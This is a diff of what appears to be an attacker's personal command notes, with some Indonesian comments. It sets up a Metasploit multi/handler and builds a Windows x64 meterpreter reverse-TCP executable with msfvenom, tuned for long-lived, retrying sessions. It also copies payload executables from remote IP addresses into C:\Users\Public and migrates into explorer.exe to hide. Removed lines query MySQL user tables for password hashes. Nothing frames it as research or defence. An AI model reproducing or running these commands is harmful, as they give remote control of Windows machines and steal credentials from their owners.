@@ -1,13 +1,22 @@
-scp root@188.166.181.139:windows4444.exe C:\Users\Public
+scp root@146.190.83.1:windows44442.exe C:\Users\Public
 screen -r windows4444
+screen -r windows5555
 
 
- use exploit/multi/handler
-set PAYLOAD windows/meterpreter/reverse_tcp
-set PAYLOAD windows/x64/meterpreter/reverse_https
-set LHOST 168.144.103.21
-set LPORT 53
-scp root@168.144.103.21:x64P53.exe C:\Users\Public
-SELECT User, Host, plugin, authentication_string FROM mysql.user;
- SELECT User, Host, Password FROM mysql.user;
+ps | grep explorer.exe
+migrate id exploler
 
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter_reverse_tcp
+set LHOST 146.190.83.1
+set LPORT PORT_ANDA
+set ReverseListenerBindAddress 0.0.0.0
+set SessionCommunicationTimeout 86400
+set SessionRetryTotal 86400
+
+# Jalankan listener
+exploit -j -z
+
+
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=146.190.83.1 LPORT=PORT_ANDA 
+SessionRetryTotal=86400 SessionRetryWait=16 PayloadUUIDTracking=true -f exe -o payload_stabil.exe
